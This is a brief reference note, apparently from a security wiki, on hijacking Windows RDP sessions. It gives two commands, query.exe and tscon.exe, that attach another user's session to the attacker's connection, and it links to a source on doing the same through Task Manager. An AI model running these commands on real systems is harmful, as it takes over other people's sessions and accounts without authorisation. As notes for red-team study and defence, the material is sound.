---
title: RDP Session Takeover
---

[[notes/mitre-attack/credential-access]] on [[notes/windows/index]] by taking over [[notes/network/rdp]] sessions.

~~~ bat
query.exe user
tscon.exe 1 /dest:rdp-tcp#55
~~~

This can be done via task manager as well ([source](https://web.archive.org/web/20221111181338/https://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html)).
